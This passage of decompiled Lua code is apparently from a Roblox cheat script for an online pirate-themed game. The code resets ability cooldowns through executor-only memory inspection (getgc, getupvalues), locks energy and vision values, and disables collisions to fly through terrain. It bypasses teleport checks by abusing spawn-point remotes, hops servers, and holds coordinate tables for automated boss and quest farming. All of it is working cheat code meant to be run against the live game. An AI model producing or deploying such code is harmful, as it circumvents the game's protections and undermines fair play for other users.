    getInfinity_Ability = function(arg, arg2)
        local v17, v18, v19, v20, v21, v22, v23, v24, v25, v26, v27, v28, v29, v30, v31, n
        n = 1

        while true do
            if n == 1 then
                if humanoidRootPart then
                    n = 2
                else
                    n = 16
                end
            elseif n == 2 then
                if arg == "Soru" and arg2 then
                    n = 7
                else
                    n = 3
                end
            elseif n == 3 then
                if arg == "Energy" and arg2 then
                    n = 6
                else
                    n = 4
                end
            elseif n == 4 then
                if arg == "Observation" and arg2 then
                    n = 5
                else
                    n = 15
                end
            elseif n == 5 then
                localPlayer.VisionRadius.Value = math.huge
                n = 15
            elseif n == 6 then
                localPlayer.Character.Energy.Changed:connect(function()
                    if arg2 then
                        localPlayer.Character.Energy.Value = Energy
                    end
                end)

                n = 15
            elseif n == 7 then
                v17, v18 = getgc()
                v19 = v18
                v20 = next
                v21 = v17
                n = 8
            elseif n == 8 then
                v22, v23 = v20(v21, v19)

                if v22 == nil then
                    n = 15
                else
                    n = 9
                end
            elseif n == 9 then
                v19 = v22

                if localPlayer.Character.Soru and typeof(v23) == "function" and getfenv(v23).script == localPlayer.Character.Soru then
                    n = 10
                else
                    n = 8
                end
            elseif n == 10 then
                v24 = next
                v25, v26 = getupvalues(v23)
                v27 = v20
                v28 = v21
                v29 = v26
                n = 11
            elseif n == 11 then
                v30, v31 = v24(v25, v29)

                if v30 == nil then
                    n = 14
                else
                    n = 12
                end
            elseif n == 12 then
                v29 = v30

                if typeof(v31) == "table" then
                    n = 13
                else
                    n = 11
                end
            elseif n == 13 then
                wait(Sec)
                v31.LastUse = 0

                if arg2 and localPlayer.Character.Humanoid.Health > 0 then
                    n = 13
                else
                    n = 11
                end
            elseif n == 14 then
                v19 = v22
                v20 = v27
                v21 = v28
                n = 8
            elseif n == 15 then
                return
            elseif n == 16 then
                return
            end
        end
    end

    Hop = function()
        pcall(function()
            local v17 = nil

            for i = math.random(1, math.random(40, 75)), 100 do
                local response = ReplicatedStorage2.__ServerBrowser:InvokeServer(i)
                local v18 = next

                while true do
                    local v19, v20 = v18(response, v17)
                    if v19 == nil then
                        break
                    end
                    v17 = v19

                    if tonumber(v20.Count) < 12 then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, v19)
                    end
                end

                v17 = nil
            end
        end)
    end

    local ReplicatedStorage3 = game:GetService("ReplicatedStorage")
    game:GetService("Workspace")
    local RunService = game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    getgenv().TweenPaused = false
    getgenv().currentMove = nil
    getgenv().CurrentTween = nil
    local connection = nil
    local tbl10 = {}
    local flag5 = false

    stoptam = function()
        if getgenv().CurrentTween then
            pcall(function()
                getgenv().CurrentTween:Cancel()
            end)

            getgenv().CurrentTween = nil
        end

        if getgenv().currentMove then
            pcall(function()
                getgenv().currentMove:Disconnect()
            end)

            getgenv().currentMove = nil
        end

        flag5 = false
    end

    local function fn5()
        local caylv = _G.caylv
        local bonefarm = caylv or _G.bonefarm or _G.allboss or _G.autoboss or _G.farmmas or _G.masfullsw or _G.farmaura or _G.collectruong or _G.tyr or _G.doughking or _G.farmsc or _G.caunguyen or _G.tryluck or _G.farmkata or _G.skullguitar or _G.obsFarm or _G.kenhakif or _G.hakicv or _G.AutoRipIngay or _G.Auto_Tushita or _G.Auto_RaceV2 or _G.Auto_RaceV3 or _G.Auto_Yama or _G.CDK_YM or _G.CDK_TS or _G.CDK or _G.farmelite or _G.autopiratesea or _G.bartilonv or _G.citizen or _G.memaybeo or _G.cavender or _G.twh or _G.AutoFishAtPos2 or _G.cungmangxa or _G.kilo or _G.laww or _G.farmsaw or _G.farmsb or _G.coolshad or _G.iceboss or _G.keys or _G.tridenw2 or _G.daisw or _G.blsp or _G.swann or _G.whitebeard or _G.ecboss or _G.dakcoat or _G.WardenBoss or _G.MarinesCoat or _G.SwanCoat or _G.TravelDres or _G.AutoZou or _G.SailBoat or _G.SailBoat_Hydra or _G.FindMirage or _G.kitsunefind or _G.Prehis_Find or _G.TpLab or _G.TpDung or _G.Tp_MasterA or _G.UPGDrago or _G.DT_Uzoth or _G.TpDrago_Prehis or _G.TPTemple or _G.TPDoor or _G.buydracorace or _G.autotrial or _G.Relic123 or _G.TrainDrago or _G.AncientOne or _G.AutoFireFlowers or _G.dracov1 or _G.HighestMirage or _G.TPGEAR or _G.Addealer or _G.FarmChestM or _G.nguyenlieuskull or _G.Dojoo or _G.TpPly or _G.Raiding or _G.sanguineart or _G.DarkBladev3 or _G.Travelis or _G.tweenShrine or _G.FrozenTP or _G.seabeatfarm or _G.FishBoat or _G.PGB
        return bonefarm
    end

    fn = function(cFrame)
        local character3 = localPlayer.Character

        if character3 and character3:FindFirstChild("HumanoidRootPart") then
            character3.HumanoidRootPart.CFrame = cFrame
        end
    end

    local function fn6(arg)
        if not arg or not arg:FindFirstChild("Head") then
            return
        end
        local head = arg.Head

        if not head:FindFirstChild("AntiFallVelocity") then
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Name = "AntiFallVelocity"
            bodyVelocity.Velocity = Vector3.zero
            bodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
            bodyVelocity.P = 9000000000
            bodyVelocity.Parent = head
        end

        local humanoid = arg:FindFirstChild("Humanoid")

        if humanoid then
            humanoid:SetStateEnabled(5, false)
        end
    end

    local function fn7(arg)
        if arg and arg:FindFirstChild("Head") then
            local antiFallVelocity = arg.Head:FindFirstChild("AntiFallVelocity")

            if antiFallVelocity then
                antiFallVelocity:Destroy()
            end
        end

        if arg then
            local humanoid = arg:FindFirstChild("Humanoid")

            if humanoid then
                humanoid:SetStateEnabled(5, true)
            end
        end
    end

    local function fn8(arg)
        tbl10 = {}

        for i, descendant in ipairs(arg:GetDescendants()) do
            if descendant:IsA("BasePart") then
                tbl10[descendant] = descendant.CanCollide
                descendant.CanCollide = false
            end
        end

        if connection then
            connection:Disconnect()
        end

        connection = RunService.Stepped:Connect(function()
            if not flag5 or not arg or not arg.Parent then
                return
            end

            for i, descendant in ipairs(arg:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.CanCollide = false
                end
            end
        end)
    end

    local function fn9()
        if connection then
            connection:Disconnect()
            connection = nil
        end

        for k, v17 in pairs(tbl10) do
            if k and k.Parent then
                k.CanCollide = v17
            end
        end

        tbl10 = {}
    end

    local function fn10()
        flag5 = false

        if getgenv().CurrentTween then
            pcall(function()
                getgenv().CurrentTween:Cancel()
            end)

            getgenv().CurrentTween = nil
        end

        if getgenv().currentMove then
            getgenv().currentMove:Disconnect()
            getgenv().currentMove = nil
        end
    end

    localPlayer.CharacterAdded:Connect(function()
        fn10()
        fn9()
        fn7(localPlayer.Character)
    end)

    RunService.Heartbeat:Connect(function()
        pcall(function()
            if not _G.Safemode or getgenv().TweenPaused then
                return
            end
            local character3 = localPlayer.Character
            if not character3 then
                return
            end
            local humanoid = character3:FindFirstChildOfClass("Humanoid")
            local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
            if not humanoid or not humanoidRootPart2 then
                return
            end

            if humanoid.Health / humanoid.MaxHealth * 100 <= 50 then
                fn10()
                fn8(character3)
                fn6(character3)

                repeat
                    RunService.Heartbeat:Wait()
                until not _G.Safemode or humanoid.Health / humanoid.MaxHealth * 100 >= 65 or not character3 or not character3.Parent

                fn9()
                fn7(character3)
            end
        end)
    end)

    local function fn11(arg)
        local position = arg.Position
        local v17 = nil
        local huge = math.huge
        local tbl11 = {}

        if World3 then
            tbl11 = {
                Vector3.new(-5096.27, 314.74, -3142.8),
                Vector3.new(-12471.17, 375.14, -7551.68),
                Vector3.new(5643.49, 1014.52, -341.89),
                Vector3.new(3028.59, 2281.08, -7324.82),
            }
        elseif World2 then
            tbl11 = {
                Vector3.new(2285, 15, 905),
                Vector3.new(923, 126, 32852),
                Vector3.new(-6508.55, 83.44, -132.84),
                Vector3.new(-286.99, 306.35, 597.79),
                Vector3.new(3028.59, 2281.08, -7324.82),
                Vector3.new(28286.36, 14896.73, 102.62),
            }
        elseif World1 then
            tbl11 = {
                Vector3.new(-4652, 873, -1754),
                Vector3.new(-7895, 5547, -380),
                Vector3.new(61164, 5, 1820),
                Vector3.new(3865, 5, -1926),
            }
        end

        for i, v18 in ipairs(tbl11) do
            local magnitude = (v18 - position).Magnitude

            if magnitude < huge then
                huge = magnitude
                v17 = v18
            end
        end

        local character3 = localPlayer.Character
        local humanoidRootPart2 = character3 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart2 and v17 and huge <= (position - humanoidRootPart2.Position).Magnitude then
            return v17
        end
    end

    local function fn12(arg)
        local character3 = localPlayer.Character
        local humanoidRootPart2 = character3 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return false
        end
        local vector = Vector3.new(-16813.4395, 58.874836, 304.873962)
        local vector2 = Vector3.new(-5097.93164, 316.447021, -3142.66602)

        if World3 and (arg - vector).Magnitude < 50 then
            ReplicatedStorage3.Remotes.CommF_:InvokeServer("requestEntrance", vector2)
            task.wait(1)
            ReplicatedStorage3.Modules.Net["RF/BoatCastleTeleporters"]:InvokeServer("InitiateTeleport", workspace:WaitForChild("Map"):WaitForChild("Boat Castle"):WaitForChild("MapTeleportC"))
            task.wait(0.5)
        else
            ReplicatedStorage3.Remotes.CommF_:InvokeServer("requestEntrance", arg)
            humanoidRootPart2.CFrame = humanoidRootPart2.CFrame + Vector3.new(0, 50, 0)
            task.wait(1)
        end

        return true
    end

    local function fn13(arg)
        local position = typeof(arg) == "CFrame" and arg.Position or arg
        local v17 = next
        local children, v18 = workspace._WorldOrigin.Locations:GetChildren()

        for k, v19 in v17, children, v18 do
            if (position - v19.Position).Magnitude <= v19.Mesh.Scale.X then
                return v19
            end
        end

        return {Name = ""}
    end

    local function fn14()
        local v17, v18, v19 = pairs({
            "God's Chalice",
            "Fist of Darkness",
            "Sweet Chalice",
            "Hallow Essence",
            "Flower1",
            "Microchip",
        })

        local v20 = v19
        local v21 = v17
        local v22 = v18

        while true do
            local v23, v24 = v21(v22, v20)
            if v23 == nil then
                break
            end

            for k, child in pairs(localPlayer.Backpack:GetChildren()) do
                if child:IsA("Tool") and string.find(child.Name, v24) then
                    return true
                end
            end

            for k, child in pairs(localPlayer.Character:GetChildren()) do
                if child:IsA("Tool") and string.find(child.Name, v24) then
                    return true
                end
            end

            v20 = v23
        end
    end

    local function fn15(arg)
        local v17 = next
        local children, v18 = workspace._WorldOrigin.PlayerSpawns.Pirates:GetChildren()

        for k, v19 in v17, children, v18 do
            if (v19.Part.Position - arg.Position).Magnitude <= 2500 then
                return v19
            end
        end
    end

    local function fn16(arg)
        local huge = math.huge
        local v17 = nil
        local v18 = next
        local children, v19 = workspace._WorldOrigin.PlayerSpawns.Pirates:GetChildren()

        for k, v20 in v18, children, v19 do
            local humanoidRootPart2 = localPlayer.Character.HumanoidRootPart

            if (arg.Position - humanoidRootPart2.Position).Magnitude >= 1000 and fn15(v20.Part) ~= fn15(humanoidRootPart2) and (v20.Part.Position - humanoidRootPart2.Position).Magnitude <= 10000 and (v20.Part.Position - arg.Position).Magnitude <= huge then
                huge = (v20.Part.Position - arg.Position).Magnitude
                v17 = v20
            end
        end

        return v17
    end

    local function fn17(arg)
        local name = fn13(arg).Name
        if name == "" then
            return false
        end

        if not _G.BypassCF or name:find("Dimension") or name:find("Submerged") or name == "Sealed Cavern" or name:lower():find("under") or fn14() then
            return false
        end

        if localPlayer.Data.LastSpawnPoint.Value == "SubmergedIsland" then
            return false
        end

        if (arg.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3500 then
            return false
        end
        return true
    end

    local function fn18(arg)
        local character3 = localPlayer.Character
        if not character3 then
            return false
        end
        local humanoid = character3:FindFirstChild("Humanoid")
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoid or not humanoidRootPart2 or humanoid.Health <= 0 then
            return false
        end

        if not fn17(arg) then
            return false
        end
        local v17 = fn16(arg)
        if not v17 then
            return false
        end
        local position = humanoidRootPart2.Position
        character3.LastSpawnPoint.Disabled = true
        ReplicatedStorage3.Remotes.CommF_:InvokeServer("SetLastSpawnPoint", v17.Name)
        ReplicatedStorage3.Remotes.CommF_:InvokeServer("SetSpawnPoint")
        character3:PivotTo(v17.Part.CFrame)
        humanoid:ChangeState(15)
        local flag6 = false
        local now = tick()

        repeat
            task.wait(0.15)
            if not character3 or not character3.Parent then
                break
            end

            if (humanoidRootPart2.Position - position).Magnitude > 300 then
                flag6 = true
                break
            end
        until tick() - now > 2

        flag5 = false
        return flag6
    end

    tween = function(arg)
        if getgenv().TweenPaused then
            return
        end

        if not fn5() then
            return
        end

        if typeof(arg) ~= "CFrame" then
            return
        end
        local character3 = localPlayer.Character
        if not character3 then
            return
        end
        local humanoid = character3:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoid or not humanoidRootPart2 or humanoid.Health <= 0 then
            return
        end

        if not _G.SailBoats then
            humanoid.Sit = false
        end

        humanoidRootPart2.Anchored = false
        local position = arg.Position
        local y = arg.Y
        local cframe = CFrame.new(position.X, humanoidRootPart2.Position.Y, position.Z)
        local magnitude = (cframe.Position - humanoidRootPart2.Position).Magnitude

        if magnitude <= 0 then
            fn(arg)
            task.wait(0.05)

            if humanoidRootPart2 and humanoidRootPart2.Parent then
                humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position.X, y, humanoidRootPart2.Position.Z)
            end

            return
        end

        fn8(character3)
        fn6(character3)

        if not _G.SailBoat then
            if not _G.Travelis then
                task.spawn(function()
                    fn18(arg)
                end)
            end

            local v17 = fn11(arg)

            if v17 then
                task.spawn(function()
                    pcall(function()
                        fn12(v17)
                    end)
                end)
            end
        end

        local n

        if magnitude < 400 then
            n = 1000
        else
            local tweenSpeed = _G.TweenSpeed
            local n2 = tweenSpeed or 350
            n = n2
        end

        flag5 = true
        local tween_ = TweenService:Create(humanoidRootPart2, TweenInfo.new(magnitude / n, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {CFrame = cframe})
        getgenv().CurrentTween = tween_
        tween_:Play()
        local connection2 = nil

        connection2 = tween_.Completed:Connect(function()
            flag5 = false
            getgenv().CurrentTween = nil
            connection2:Disconnect()
        end)

        repeat
            RunService.Heartbeat:Wait()
        until not flag5 or getgenv().TweenPaused or not fn5() or tween_.PlaybackState == Enum.PlaybackState.Completed

        if not getgenv().TweenPaused and fn5() then
            fn10()
            task.wait(0.05)

            if humanoidRootPart2 and humanoidRootPart2.Parent then
                humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart2.Position.X, y, humanoidRootPart2.Position.Z)
            end

            fn9()
            fn7(character3)
            return
        end

        fn10()
        fn9()
        fn7(character3)
    end

    local Players = game:GetService("Players")
    local RunService2 = game:GetService("RunService")
    local localPlayer4 = Players.LocalPlayer
    getgenv().TweenPaused2 = false
    getgenv().currentMove2 = nil
    local flag6 = false

    local function fn19()
        local findMirage = _G.FindMirage
        local prehisFind = findMirage or _G.Prehis_Find or _G.kitsunefind or _G.SailBoats or _G.SailBoat_Hydra
        return prehisFind
    end

    local function fn20()
        local currentTween = getgenv().CurrentTween
        local currentMove = currentTween or getgenv().currentMove
        return currentMove
    end

    fn2 = function()
        flag6 = false

        if getgenv().currentMove2 then
            getgenv().currentMove2:Disconnect()
            getgenv().currentMove2 = nil
        end
    end

    local function fn21(arg, cFrame)
        fn2()
        local position = arg.Position
        local position2 = cFrame.Position
        local n = position2 - position
        local magnitude = n.Magnitude
        if magnitude <= 0 then
            return
        end
        local n2 = magnitude < 400 and 370

        if not n2 then
            local tweenSpeed2 = _G.TweenSpeed2
            n2 = tweenSpeed2 or 350
        end

        local unit = n.Unit
        local n3 = 0
        flag6 = true

        getgenv().currentMove2 = RunService2.Heartbeat:Connect(function(deltaTime)
            if flag6 and not getgenv().TweenPaused2 and fn19() and not fn20() and (not _G.SailBoats or not IsDoingSeaEvent or not IsDoingSeaEvent()) then
                n3 = n3 + n2 * deltaTime

                if magnitude <= n3 then
                    arg.CFrame = cFrame
                    fn2()
                    return
                end

                arg.CFrame = CFrame.new(position + unit * n3, position2)
                return
            end

            fn2()
        end)
    end

    tween2 = function(arg)
        if getgenv().TweenPaused2 or not fn19() then
            return
        end

        if fn20() then
            return
        end

        if typeof(arg) ~= "CFrame" then
            return
        end
        local character3 = localPlayer4.Character
        if not character3 then
            return
        end
        local humanoid = character3:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoid or not humanoidRootPart2 or humanoid.Health <= 0 then
            return
        end
        humanoidRootPart2.Anchored = false
        fn21(humanoidRootPart2, arg)
    end

    localPlayer4.CharacterAdded:Connect(function()
        fn2()
    end)

    local Players2 = game:GetService("Players")
    local RunService3 = game:GetService("RunService")
    local localPlayer5 = Players2.LocalPlayer
    getgenv().TweenPaused3 = false
    getgenv().currentMove3 = nil
    local flag7 = false

    local function fn22()
        flag7 = false

        if getgenv().currentMove3 then
            getgenv().currentMove3:Disconnect()
            getgenv().currentMove3 = nil
        end
    end

    local function fn23(arg, cFrame)
        fn22()
        local position = arg.Position
        local position2 = cFrame.Position
        local n = position2 - position
        local magnitude = n.Magnitude
        if magnitude <= 0 then
            return
        end
        local n2 = magnitude < 400 and 370

        if not n2 then
            local tweenSpeed3 = _G.TweenSpeed3
            n2 = tweenSpeed3 or 350
        end

        local unit = n.Unit
        local n3 = 0
        flag7 = true

        getgenv().currentMove3 = RunService3.Heartbeat:Connect(function(deltaTime)
            if flag7 and not getgenv().TweenPaused3 then
                n3 = n3 + n2 * deltaTime

                if magnitude <= n3 then
                    arg.CFrame = cFrame
                    fn22()
                    return
                end

                arg.CFrame = CFrame.new(position + unit * n3, position2)
                return
            end

            fn22()
        end)
    end

    tween3 = function(arg)
        if getgenv().TweenPaused3 then
            return
        end

        if typeof(arg) ~= "CFrame" then
            return
        end
        local character3 = localPlayer5.Character
        if not character3 then
            return
        end
        local humanoid = character3:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoid or not humanoidRootPart2 or humanoid.Health <= 0 then
            return
        end
        humanoidRootPart2.Anchored = false
        fn23(humanoidRootPart2, arg)
    end

    localPlayer5.CharacterAdded:Connect(function()
        fn22()
    end)

    QuestB = function()
        if World1 then
            if _G.FindBoss == "The Gorilla King" then
                bMon = "The Gorilla King"
                NVCheck = "JungleQuest"
                NVInfo = 3
                local cframe = CFrame.new(-1598, 37, 153)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-1128, 6, -451)
                PosB = cframe2
            elseif _G.FindBoss == "Bobby" then
                bMon = "Bobby"
                NVCheck = "BuggyQuest1"
                NVInfo = 3
                local cframe = CFrame.new(-1140, 4, 3829)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-1131, 14, 4080)
                PosB = cframe2
            elseif _G.FindBoss == "The Saw" then
                bMon = "The Saw"
                local cframe = CFrame.new(-690, 15, 1583)
                PosB = cframe
            elseif _G.FindBoss == "Yeti" then
                bMon = "Yeti"
                NVCheck = "SnowQuest"
                NVInfo = 3
                local cframe = CFrame.new(1385, 87, -1298)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(1185, 106, -1518)
                PosB = cframe2
            elseif _G.FindBoss == "Vice Admiral" then
                bMon = "Vice Admiral"
                NVCheck = "MarineQuest2"
                NVInfo = 2
                local cframe = CFrame.new(-5035, 29, 4326)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-4807, 21, 4360)
                PosB = cframe2
            elseif _G.FindBoss == "Saber Expert" then
                bMon = "Saber Expert"
                local cframe = CFrame.new(-1461, 30, -51)
                PosB = cframe
            elseif _G.FindBoss == "Warden" then
                bMon = "Warden"
                NVCheck = "ImpelQuest"
                NVInfo = 1
                local cframe = CFrame.new(5191, 4, 692)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(5230, 4, 749)
                PosB = cframe2
            elseif _G.FindBoss == "Chief Warden" then
                bMon = "Chief Warden"
                NVCheck = "ImpelQuest"
                NVInfo = 2
                local cframe = CFrame.new(5191, 4, 692)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(5230, 4, 749)
                PosB = cframe2
            elseif _G.FindBoss == "Swan" then
                bMon = "Swan"
                NVCheck = "ImpelQuest"
                NVInfo = 3
                local cframe = CFrame.new(5191, 4, 692)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(5230, 4, 749)
                PosB = cframe2
            elseif _G.FindBoss == "Magma Admiral" then
                bMon = "Magma Admiral"
                NVCheck = "MagmaQuest"
                NVInfo = 3
                local cframe = CFrame.new(-5319, 12, 8515)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-5694, 18, 8735)
                PosB = cframe2
            elseif _G.FindBoss == "Fishman Lord" then
                bMon = "Fishman Lord"
                NVCheck = "FishmanQuest"
                NVInfo = 3
                local cframe = CFrame.new(61122, 18, 1567)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(61350, 31, 1095)
                PosB = cframe2
            elseif _G.FindBoss == "Wysper" then
                bMon = "Wysper"
                NVCheck = "SkyExp1Quest"
                NVInfo = 3
                local cframe = CFrame.new(-7861, 5545, -381)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-7927, 5551, -637)
                PosB = cframe2
            elseif _G.FindBoss == "Thunder God" then
                bMon = "Thunder God"
                NVCheck = "SkyExp2Quest"
                NVInfo = 3
                local cframe = CFrame.new(-7903, 5636, -1412)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-7751, 5607, -2315)
                PosB = cframe2
            elseif _G.FindBoss == "Cyborg" then
                bMon = "Cyborg"
                NVCheck = "FountainQuest"
                NVInfo = 3
                local cframe = CFrame.new(5258, 39, 4052)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(6138, 10, 3939)
                PosB = cframe2
            elseif _G.FindBoss == "whitebeard" then
                bMon = "whitebeard"
                local cframe = CFrame.new(-5043, 25, 4262)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-5043, 25, 4262)
                PosB = cframe2
            end
        end

        if World2 then
            if _G.FindBoss == "Diamond" then
                bMon = "Diamond"
                NVCheck = "Area1Quest"
                NVInfo = 3
                local cframe = CFrame.new(-427, 73, 1835)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-1569, 199, -31)
                PosB = cframe2
            elseif _G.FindBoss == "Jeremy" then
                bMon = "Jeremy"
                NVCheck = "Area2Quest"
                NVInfo = 3
                local cframe = CFrame.new(635, 73, 919)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(2316, 449, 787)
                PosB = cframe2
            elseif _G.FindBoss == "Fajita" then
                bMon = "Orbitus"
                NVCheck = "MarineQuest3"
                NVInfo = 3
                local cframe = CFrame.new(-2441, 73, -3219)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-2086, 73, -4208)
                PosB = cframe2
            elseif _G.FindBoss == "Don Swan" then
                bMon = "Don Swan"
                local cframe = CFrame.new(2289, 15, 808)
                PosB = cframe
            elseif _G.FindBoss == "Smoke Admiral" then
                bMon = "Smoke Admiral"
                NVCheck = "IceSideQuest"
                NVInfo = 3
                local cframe = CFrame.new(-6061, 16, -4904)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-5078, 24, -5352)
                PosB = cframe2
            elseif _G.FindBoss == "Awakened Ice Admiral" then
                bMon = "Awakened Ice Admiral"
                NVCheck = "FrostQuest"
                NVInfo = 3
                local cframe = CFrame.new(5668, 28, -6484)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(6473, 297, -6944)
                PosB = cframe2
            elseif _G.FindBoss == "Tide Keeper" then
                bMon = "Tide Keeper"
                NVCheck = "ForgottenQuest"
                NVInfo = 3
                local cframe = CFrame.new(-3056, 240, -10145)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-3711, 77, -11469)
                PosB = cframe2
            elseif _G.FindBoss == "Darkbeard" then
                bMon = "Darkbeard"
                local cframe = CFrame.new(3695, 13, -3599)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(3695, 13, -3599)
                PosB = cframe2
            elseif _G.FindBoss == "Cursed Captain" then
                bMon = "Cursed Captain"
                local cframe = CFrame.new(912, 186, 33591)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(912, 186, 33591)
                PosB = cframe2
            end
        end

        if World3 then
            if _G.FindBoss == "Stone" then
                bMon = "Stone"
                NVCheck = "PiratePortQuest"
                NVInfo = 3
                local cframe = CFrame.new(-449, 109, 5950)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-1049, 40, 6791)
                PosB = cframe2
            elseif _G.FindBoss == "Hydra Leader" then
                bMon = "Hydra Leader"
                NVCheck = "VenomCrewQuest"
                NVInfo = 3
                local cframe = CFrame.new(5214, 1004, 761)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(5836, 1019, -83)
                PosB = cframe2
            elseif _G.FindBoss == "Kilo Admiral" then
                bMon = "Kilo Admiral"
                NVCheck = "MarineTreeIsland"
                NVInfo = 3
                local cframe = CFrame.new(2485, 74, -6788)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(2904, 509, -7349)
                PosB = cframe2
            elseif _G.FindBoss == "Captain Elephant" then
                bMon = "Captain Elephant"
                NVCheck = "DeepForestIsland"
                NVInfo = 3
                local cframe = CFrame.new(-13233, 332, -7626)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-13393, 319, -8423)
                PosB = cframe2
            elseif _G.FindBoss == "Beautiful Pirate" then
                bMon = "Beautiful Pirate"
                NVCheck = "DeepForestIsland2"
                NVInfo = 3
                local cframe = CFrame.new(-12682, 391, -9901)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(5370, 22, -89)
                PosB = cframe2
            elseif _G.FindBoss == "Cake Queen" then
                bMon = "Cake Queen"
                NVCheck = "IceCreamIslandQuest"
                NVInfo = 3
                local cframe = CFrame.new(-818, 66, -10964)
                NVCfBoss = cframe
                local cframe2 = CFrame.new(-710, 382, -11150)
                PosB = cframe2
            elseif _G.FindBoss == "Longma" then
                bMon = "Longma"
                local cframe = CFrame.new(-10218, 333, -9444)
                PosB = cframe
            end
        end
    end

    QuestBeta = function()
        QuestB()

        return {
            [0] = _G.FindBoss,
            [1] = bMon,
            [2] = NVInfo,
            [3] = NVCheck,
            [4] = PosB,
        }
    end

    QuestCheck = function()
        local value = game.Players.LocalPlayer.Data.Level.Value

        if World1 then
            if value ~= 1 and value > 9 then
                if value ~= 10 and value > 14 then
                    if value ~= 15 and value > 29 then
                        if value ~= 30 and value > 39 then
                            if value ~= 40 and value > 59 then
                                if value ~= 60 and value > 74 then
                                    if value ~= 75 and value > 89 then
                                        if value ~= 90 and value > 99 then
                                            if value ~= 100 and value > 119 then
                                                if value ~= 120 and value > 149 then
                                                    if value ~= 150 and value > 174 then
                                                        if value ~= 175 and value > 189 then
                                                            if value ~= 190 and value > 209 then
                                                                if value ~= 210 and value > 249 then
                                                                    if value ~= 250 and value > 274 then
                                                                        if value ~= 275 and value > 299 then
                                                                            if value ~= 300 and value > 324 then
                                                                                if value ~= 325 and value > 374 then
                                                                                    if value ~= 375 and value > 399 then
                                                                                        if value ~= 400 and value > 449 then
                                                                                            if value ~= 450 and value > 474 then
                                                                                                if value ~= 475 and value > 524 then
                                                                                                    if value ~= 525 and value > 549 then
                                                                                                        if value ~= 550 and value > 624 then
                                                                                                            if value ~= 625 and value > 649 then
                                                                                                                if value >= 650 then
                                                                                                                    Mon = "Galley Captain"
                                                                                                                    NVInfo = 2
                                                                                                                    NVCheck = "FountainQuest"
                                                                                                                    MobInfo = "Galley Captain"
                                                                                                                    local cframe = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                                                                                                                    NVCf = cframe
                                                                                                                    local cframe2 = CFrame.new(5441.9516601562, 42.502059936523, 4950.09375)
                                                                                                                    CfM = cframe2
                                                                                                                end
                                                                                                            else
                                                                                                                Mon = "Galley Pirate"
                                                                                                                NVInfo = 1
                                                                                                                NVCheck = "FountainQuest"
                                                                                                                MobInfo = "Galley Pirate"
                                                                                                                local cframe = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                                                                                                                NVCf = cframe
                                                                                                                local cframe2 = CFrame.new(5551.0219726562, 78.901351928711, 3930.4128417969)
                                                                                                                CfM = cframe2
                                                                                                            end
                                                                                                        else
                                                                                                            Mon = "Royal Soldier"
                                                                                                            NVInfo = 2
                                                                                                            NVCheck = "SkyExp2Quest"
                                                                                                            MobInfo = "Royal Soldier"
                                                                                                            local cframe = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                                            NVCf = cframe
                                                                                                            local cframe2 = CFrame.new(-7836.7534179688, 5645.6640625, -1790.6236572266)
                                                                                                            CfM = cframe2
                                                                                                        end
                                                                                                    else
                                                                                                        Mon = "Royal Squad"
                                                                                                        NVInfo = 1
                                                                                                        NVCheck = "SkyExp2Quest"
                                                                                                        MobInfo = "Royal Squad"
                                                                                                        local cframe = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                                        NVCf = cframe
                                                                                                        local cframe2 = CFrame.new(-7624.2524414062, 5658.1333007812, -1467.3542480469)
                                                                                                        CfM = cframe2
                                                                                                    end
                                                                                                else
                                                                                                    Mon = "Shanda"
                                                                                                    NVInfo = 2
                                                                                                    NVCheck = "SkyExp1Quest"
                                                                                                    MobInfo = "Shanda"
